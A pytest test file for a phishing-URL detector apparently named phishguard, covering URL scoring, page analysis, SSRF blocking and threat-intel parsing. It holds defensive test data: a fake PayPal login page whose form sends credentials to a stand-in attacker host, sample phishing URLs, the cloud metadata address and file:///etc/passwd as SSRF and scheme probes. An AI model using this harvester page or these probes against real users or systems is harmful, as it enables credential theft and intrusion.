import asyncio
import http.server
import os
import threading

import httpx
import pytest

from phishguard import features as F
from phishguard import pipeline, threat_intel
from phishguard.domain_intel import typosquat_check
from phishguard.netguard import safe_fetch
from phishguard.page_analyzer import analyze_page


def run(coro):
    return asyncio.run(coro)


# --- regression: URLs the earlier rule-based PhishBane scored as "Safe" ------
@pytest.mark.parametrize("url", [
    "facebook.unitedcolleges.net",
    "signin.eby.de.zukruygxctzmmqi.civpro.co.za",
    "br-icloud.com.br",
])
def test_phishbane_misses_are_not_safe(url):
    r = run(pipeline.analyze(url, deep=False))
    assert r["verdict"] != "safe", (url, r["score"], [e["title"] for e in r["evidence"]])
    assert r["evidence"] and r["confidence"] > 0          # always explained, never "0% / no reasons"


@pytest.mark.parametrize("url", [
    "https://www.wikipedia.org", "https://github.com/anthropics", "https://www.google.com/search?q=cats",
    "https://www.combank.lk", "https://stackoverflow.com/questions/1",
    "https://accounts.google.com/signin",            # official domain with 'signin'
])
def test_known_good_stay_safe(url):
    assert run(pipeline.analyze(url, deep=False))["verdict"] == "safe"


@pytest.mark.parametrize("url", [
    "http://paypa1-secure-login.xyz/verify", "http://192.168.10.5/login/verify-account",
    "http://secure-bank-login-update.com/@verify", "http://mail.google.com.account-check.top/login",
    "http://commerciaIbank-lk-verify.top",
])
def test_obvious_phishing_not_safe(url):
    assert run(pipeline.analyze(url, deep=False))["verdict"] != "safe"


def test_no_false_brand_hit_on_lookalike_words():
    assert F.brand_hit("pineapple.com") is None          # contains 'apple' but is not a brand token
    assert F.brand_hit("apply.mycompany.com") is None
    assert typosquat_check("apply.mycompany.com") == []   # no login context -> no typosquat flag


# --- page behaviour --------------------------------------------------------
PHISH_HTML = """<html><head><title>PayPal - Log in</title>
<link rel="icon" href="https://www.paypal.com/favicon.ico"></head><body>
<form action="https://collector.evil-host.top/steal.php" method="post">
<input name="u"><input type="password" name="p"></form>
<iframe src="x" style="display:none"></iframe>
<script>eval(atob('a'));eval(atob('b'));eval(atob('c'));</script></body></html>"""


def test_page_analyzer_finds_credential_harvester():
    ev, facts = analyze_page("http://shop-login.example-site.top/", PHISH_HTML,
                             [("http://shop-login.example-site.top/", 200)])
    ids = {e.id for e in ev}
    assert {"form_cross_domain", "brand_in_title", "hidden_iframe", "obfuscated_js", "password_over_http"} <= ids


def test_legit_login_page_not_alarming():
    html = ("<html><title>Sign in - Example</title><body>" + "<p>text</p>" * 80 +
            '<form action="/session" method="post"><input type="password"></form></body></html>')
    ev, _ = analyze_page("https://example.com/login", html, [("https://example.com/login", 200)])
    assert sum(e.points for e in ev) == 0


# --- SSRF protection ---------------------------------------------------------
@pytest.mark.parametrize("url", ["http://127.0.0.1:9/", "http://169.254.169.254/latest/meta-data/",
                                 "http://10.0.0.5/", "http://[::1]/", "http://localhost/"])
def test_ssrf_private_targets_blocked(url):
    r = run(safe_fetch(url))
    assert not r.ok and r.error and (r.error.startswith("blocked") or "DNS" in r.error), r.error


def test_rejects_non_http_schemes():
    for bad in ["ftp://example.com/x", "javascript:alert(1)", "file:///etc/passwd"]:
        with pytest.raises(pipeline.InvalidURL):
            pipeline.validate(bad)


# --- live fetch against a local test server (private IPs allowed only here) ---
class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/redirect"):
            self.send_response(302)
            self.send_header("Location", "/login")
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(PHISH_HTML.encode())

    def log_message(self, *a):
        pass


@pytest.fixture()
def local_server(monkeypatch):
    monkeypatch.setenv("PHISHGUARD_ALLOW_PRIVATE", "1")
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    yield srv.server_address[1]
    srv.shutdown()


def test_live_pipeline_detects_harvester(local_server):
    r = run(pipeline.analyze(f"http://127.0.0.1:{local_server}/redirect", deep=True))
    ids = {e["id"] for e in r["evidence"]}
    assert r["page_fetch"]["ok"] and r["page_fetch"]["redirects"] == 1
    assert "form_cross_domain" in ids and "password_over_http" in ids
    assert r["verdict"] == "phishing", (r["score"], r["breakdown"])


def test_fetch_failure_is_reported_not_called_safe(monkeypatch):
    r = run(pipeline.analyze("http://this-domain-does-not-exist-xyz123.com", deep=True))
    assert "fetch_failed" in {e["id"] for e in r["evidence"]}
    assert r["page_fetch"]["ok"] is False


# --- threat intelligence ---------------------------------------------------------
def test_local_feed_hit_forces_high_score(tmp_path, monkeypatch):
    feed = tmp_path / "blocklist.txt"
    feed.write_text("# test feed\nhttp://totally-normal-looking.org/page\n")
    monkeypatch.setattr(threat_intel, "BLOCKLIST", feed)
    threat_intel._cache.update(mtime=None, urls=set(), hosts=set())
    r = run(pipeline.analyze("http://totally-normal-looking.org/page", deep=True))
    assert r["verdict"] == "phishing" and r["score"] >= 92
    assert r["intel_status"]["local_feed"] == "listed"


def test_unconfigured_providers_are_reported_as_such(monkeypatch):
    for k in ("VIRUSTOTAL_API_KEY", "GOOGLE_SAFE_BROWSING_KEY", "URLHAUS_AUTH_KEY"):
        monkeypatch.delenv(k, raising=False)
    _, status = run(threat_intel.run_intel("http://example.org/"))
    assert status["virustotal"] == status["safe_browsing"] == status["urlhaus"] == "not_configured"


def test_virustotal_response_parsing(monkeypatch):
    monkeypatch.setenv("VIRUSTOTAL_API_KEY", "k")

    def handler(request):
        return httpx.Response(200, json={"data": {"attributes": {"last_analysis_stats": {"malicious": 7, "suspicious": 0}}}})

    async def go():
        async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as c:
            return await threat_intel.virustotal("http://x.test/", c)

    ev = run(go())
    assert ev.severity == "critical" and "7" in ev.title


def test_top_site_homepage_is_capped_but_platform_subdomains_are_not(tmp_path, monkeypatch):
    from phishguard import risk
    from phishguard.evidence import Evidence
    f = tmp_path / "top.txt"
    f.write_text("wikipedia.org\ngithub.io\n")
    monkeypatch.setattr(risk, "TOP_DOMAINS_FILE", f)
    risk._top.update(mtime=None, domains=frozenset())
    ml_flag = [Evidence("model", "ml_flag", "model", "", "high", 50)]
    r = risk.correlate(0.95, ml_flag, "wikipedia.org", {"url": True}, "www.wikipedia.org")
    assert r["score"] <= risk.TOP_SITE_CAP
    # a user page on a shared platform must NOT inherit the cap
    r2 = risk.correlate(0.95, ml_flag, "github.io", {"url": True}, "evil-login.github.io")
    assert r2["score"] > risk.TOP_SITE_CAP
    # real page-level evidence defeats the cap
    bad = ml_flag + [Evidence("page", "form_cross_domain", "x", "", "high", 30)]
    r3 = risk.correlate(0.95, bad, "wikipedia.org", {"url": True}, "wikipedia.org")
    assert r3["score"] > risk.TOP_SITE_CAP


def test_gtm_noscript_frame_is_not_flagged_but_real_hidden_frame_is():
    from phishguard.page_analyzer import analyze_page
    gtm = ('<html><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-X" '
           'height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript></body></html>')
    ev, _ = analyze_page("https://school.example.lk/", gtm, ["https://school.example.lk/"])
    assert not any(e.id == "hidden_iframe" for e in ev)
    bad = '<html><body><iframe src="https://evil.example.net/x" style="display:none"></iframe></body></html>'
    ev, _ = analyze_page("https://school.example.lk/", bad, ["https://school.example.lk/"])
    assert any(e.id == "hidden_iframe" for e in ev)


def test_clean_live_checks_reduce_model_weight_but_evidence_blocks_it():
    from phishguard import risk
    from phishguard.evidence import Evidence
    facts = {"domain": {"tls": "valid", "domain_age_days": 4000}}
    layers = {"url": True, "page": True}
    r = risk.correlate(1.0, [], "school.lk", layers, "www.school.lk", facts)
    assert r["breakdown"]["model"] < risk.MODEL_MAX_POINTS and r["verdict"] == "safe"
    young = {"domain": {"tls": "valid", "domain_age_days": 3}}
    ev = [Evidence("domain", "domain_young", "x", "", "high", 20)]
    r2 = risk.correlate(1.0, ev, "x.top", layers, "x.top", young)
    assert r2["breakdown"]["model"] == risk.MODEL_MAX_POINTS


def test_domain_age_is_cached_and_retried(monkeypatch):
    import asyncio
    import httpx
    from phishguard import domain_intel as D
    calls = {"n": 0}

    class FakeClient:
        def __init__(self, *a, **k): pass
        async def __aenter__(self): return self
        async def __aexit__(self, *a): return False
        async def get(self, url):
            calls["n"] += 1
            if calls["n"] == 1:
                raise httpx.ConnectTimeout("slow")
            return httpx.Response(200, json={"events": [{"eventAction": "registration",
                                                         "eventDate": "2010-01-01T00:00:00Z"}]})
    monkeypatch.setattr(D.httpx, "AsyncClient", FakeClient)
    D._AGE_CACHE.clear()
    ev, facts = asyncio.run(D.domain_age("example-age.lk"))
    assert facts["domain_age_days"] > 5000 and calls["n"] == 2        # first try failed, retry worked
    asyncio.run(D.domain_age("example-age.lk"))
    assert calls["n"] == 2                                            # second scan served from cache


def test_link_without_scheme_defaults_to_https_but_falls_back_to_http(local_server):
    import asyncio
    from phishguard import pipeline
    quick = asyncio.run(pipeline.analyze("example.com/path", deep=False))
    assert quick["url"].startswith("https://example.com")
    assert not any(e["id"] == "no_https" for e in quick["evidence"])          # not penalised for a missing scheme
    host = f"127.0.0.1:{local_server}"                                       # plain-http test server
    deep = asyncio.run(pipeline.analyze(host + "/", deep=True))
    assert deep["url"].startswith("http://")                                 # https probe failed -> real http site
